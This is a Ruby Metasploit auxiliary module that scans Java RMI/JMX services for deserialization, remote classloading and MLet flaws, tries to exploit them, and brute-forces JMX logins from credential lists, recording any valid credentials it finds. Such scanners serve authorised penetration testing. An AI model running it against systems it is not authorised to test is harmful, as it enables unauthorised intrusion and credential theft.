require 'msf/core'
require 'msf/core/exploit/java/serialized'
require 'msf/core/exploit/java/serialized/rmi'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Exploit::Java::Serialized::RMI

  def initialize
    super(
      'Name'        => 'JRMP/RMI/JMX Vulnerabilitiy Scanner',
      'Description' =>
      'Detects various vulnerabilites regaring JRMP/RMI/JMX protocol use,
      including remote classloading, MLET loading and deserialization 
      vulnerabilities. Also acts as a login scanner for JMX endpoints.',
      'Author'      => 'mbechler'
    )

    register_options(
      [
        Opt::RPORT(1099),
        OptBool.new('SSL', [true, 'Connect using SSL', false]),
        OptBool.new('CHECK_REFS', [true, 'Check objects referenced in registry', true]),
        OptBool.new('FOLLOW_REMOTE_REFS', [true, 'Follow remote references that could point to other systems', false]),
        OptBool.new('TRY_DESER', [true, 'Try exploit deserialization', true]),
        OptBool.new('TRY_MLET', [true, 'Try exploit MLet loading (disabled by default as this leaves objects around)', false]),
        OptBool.new('TRY_CLASSLOAD', [true, 'Try exploit remote location classloading', true]),
        OptString.new('USERNAME', [false, 'JMX username']),
        OptString.new('PASSWORD', [false, 'JMX password']),
        OptInt.new('METHOD_ID', [false, 'Method ID for testing custom legacy objects', -1]),
        OptInt.new('METHOD_HASH', [false, 'Method Hash for testing custom objects']),
        OptString.new('METHOD_SIGNATURE', [false, 'Method signature for testing custom objects (Format: <methodName> + <internalJavaSignature>, for example test(Ljava/lang/String;)Lmy/return/Type;'])
      ]
    )
  end

  def run_host(host)
    config = Msf::Exploit::Java::Serialized::RMI::PropRunConfig.new(datastore)
    check = Msf::Exploit::Java::Serialized::RMI::RMICheck.new(host,
                                       datastore['RPORT'],
                                       ssl: datastore['SSL'],
                                       username: datastore['USERNAME'],
                                       password: datastore['PASSWORD'],
                                       rc: config)

    begin
      check.run
    rescue ::Interrupt
      raise $ERROR_INFO
    rescue ::Errno::ECONNREFUSED
    end

    return if check.jmxprober.nil? || !check.jmxprober.auth

    print_status 'Seems to require authentication'

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    rport = datastore['RPORT']
    cred_collection = prepend_db_passwords(cred_collection)

    cred_collection.each do |cred|
      user = cred.public
      pass = cred.private
      unless check.jmxprober.trylogin(user, pass)
        vprint_status "#{host}:#{rport} - LOGIN FAILED: #{cred}"
        next
      end
      print_good "#{host}:#{rport} - LOGIN SUCCESSFUL: #{cred}"
      core = store_valid_credential(
        service_data: {
          origin_type: :service,
          protocol: 'tcp',
          service_name: 'jmxrmi',
          address: host,
          port: rport
        },
        private_type: :password,
        user: user,
        private: pass
      )
      break if datastore['STOP_ON_SUCCESS']
    end
  end
end
